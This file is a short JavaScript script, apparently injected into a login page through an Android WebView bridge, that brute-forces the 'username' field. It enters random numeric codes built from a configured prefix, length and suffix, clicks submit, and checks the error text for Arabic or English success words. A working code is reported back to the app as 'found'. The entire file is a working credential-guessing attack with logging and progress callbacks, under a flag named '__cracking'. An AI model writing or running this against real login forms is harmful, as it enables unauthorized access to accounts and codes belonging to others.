(function() {
    const CFG = window.FINDER_CONFIG;
    if (!CFG || window.__cracking) return;
    window.__cracking = true;
    let stopped = false;
    window.stopFinder = function() { stopped = true; window.__cracking = false; };

    const id = CFG.id;
    const log = (m) => { try { window["AndroidBridge" + id].log(m); } catch(e) {} };

    async function run() {
        log('▶ بدء');
        const input = document.querySelector('input[name="username"]');
        const btn = document.querySelector('.login-submit') || document.querySelector('button[type="submit"]');
        
        if (!input) { log('❌ لا يوجد حقل إدخال'); window.__cracking = false; return; }

        const maxVal = Math.pow(10, CFG.digits) - 1;
        let done = 0;

        for (let i = 0; i < CFG.attempts; i++) {
            if (stopped) { log('⏹ توقف'); break; }

            const num = Math.floor(Math.random() * (maxVal + 1));
            const v = CFG.prefix + String(num).padStart(CFG.digits, '0') + CFG.suffix;

            input.value = v;
            input.dispatchEvent(new Event('input', {bubbles:true}));
            input.dispatchEvent(new Event('change', {bubbles:true}));

            done++;
            try { window["AndroidBridge" + id].progress(done, CFG.attempts, v); } catch(e) {}
            log('🔍 ' + v);

            if (btn) { try { btn.click(); } catch(e) {} }

            await new Promise(r => setTimeout(r, 1000));

            const errDiv = document.getElementById('error');
            if (errDiv) {
                const err = errDiv.innerText.trim();
                if (err !== "") {
                    log('📄 ' + err);
                    if (err.includes("صحيح") || err.includes("تم") || err.includes("success")) {
                        log('✅✅✅ ' + v);
                        try { window["AndroidBridge" + id].found(v, err); } catch(e) {}
                        window.__cracking = false;
                        return;
                    }
                }
            }

            await new Promise(r => setTimeout(r, CFG.pause || 200));
        }
        log('❌ انتهى');
        window.__cracking = false;
    }

    setTimeout(run, 300);
})();
